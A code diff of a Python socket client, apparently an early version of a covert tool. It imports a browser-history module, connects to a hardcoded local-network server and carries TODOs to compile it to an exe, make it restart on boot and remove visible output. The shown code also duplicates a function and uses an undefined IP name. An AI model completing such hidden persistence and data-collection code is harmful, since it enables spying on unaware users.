@@ -1,5 +1,6 @@
 import socket,time,platform,ctypes,sys
 import browserhistory as bh
+import platform
 from datetime import datetime as dt
 
 
@@ -24,11 +25,19 @@ def operating_system():#TODO add startup capability
     elif os_name == "Windows":
         default_folder = window_host
 
-class Client():#TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
-    def __init__(self, port=8810, ip="192.168.1.28"):# ip wiil change
-        """
-        Create connection to server
-        """
+
+def operating_system():
+    global default_folder
+    os_name = platform.system()
+    if os_name == "Linux":
+        default_folder = linux_host
+    elif os_name == "Windows":
+        default_folder = window_host
+        
+        
+
+class Client():  # TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
+    def __init__(self, port=8810, ip=oran):  # ip wiil change
         self.s = socket.socket()
         self.port = port
         self.ip = ip
